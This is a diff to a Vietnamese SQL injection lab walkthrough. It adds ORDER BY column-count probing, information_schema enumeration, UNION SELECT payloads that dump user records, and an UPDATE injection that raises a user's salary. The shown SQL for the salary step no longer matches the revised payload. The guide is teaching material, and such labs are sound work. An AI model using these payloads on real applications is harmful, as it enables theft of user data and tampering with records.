@@ -91,11 +91,28 @@
   - Hiển thị tên database: `sqli_demo`
 - **Giải thích:** UNION kết hợp kết quả, hàm `database()` trả về tên database hiện tại
 
-**Bước 4: UNION-based Injection - Lấy thông tin users**
+**Bước 4: Tìm số cột của bảng products (ORDER BY)**
+- Xóa keyword, nhập: `' ORDER BY 1 #`
+- Click Search
+- **Quan sát:** Kết quả hiển thị bình thường
+- Tiếp tục thử: `' ORDER BY 2 #`, `' ORDER BY 3 #`, `' ORDER BY 4 #`
+- **Quan sát:** Khi nhập `' ORDER BY 5 #` sẽ có lỗi SQL
+- **Kết luận:** Bảng products có 4 cột (id, name, price, description)
+- **Giải thích:** ORDER BY n dùng để sắp xếp theo cột thứ n. Nếu n > số cột thì sẽ lỗi
+- `' UNION SELECT column_name, 2, 3, 4 FROM information_schema.columns WHERE table_name='users' #`
+
+
+**Bước 5: UNION-based Injection - Lấy thông tin users**
+- Đã biết bảng products có 4 cột, cần UNION với 4 cột từ bảng users
 - Xóa keyword, nhập: `' UNION SELECT id, username, email, role FROM users #`
 - Click Search
 - **Quan sát:** Hiển thị danh sách users từ bảng users
-- **Giải thích:** UNION cho phép đọc dữ liệu từ bảng khác
+- **Giải thích:** UNION cho phép đọc dữ liệu từ bảng khác, nhưng số cột phải khớp
+
+**Lưu ý:** Nếu không biết tên cột, có thể thử:
+- `' UNION SELECT 1, 2, 3, 4 FROM users #` - để xem có bao nhiêu cột
+- Sau đó dùng `' UNION SELECT NULL, NULL, NULL, NULL FROM users #` để test
+- Hoặc dùng `' UNION SELECT * FROM users #` nếu số cột khớp
 
 ---
 
@@ -148,7 +165,7 @@
 
 **Bước 3: SQL Injection để tăng lương**
 - Trong trường **Nickname**, xóa giá trị hiện tại
-- Nhập: `', salary=99999.00 WHERE username='alice`
+- Nhập: `', salary=99999.00 WHERE username='alice' #`
 - Click "Update Profile"
 - **Quan sát:**
   - Câu SQL: `UPDATE users SET nickname='', salary=99999.00 WHERE username='alice', email='...', address='...', phone='...' WHERE username='alice'`
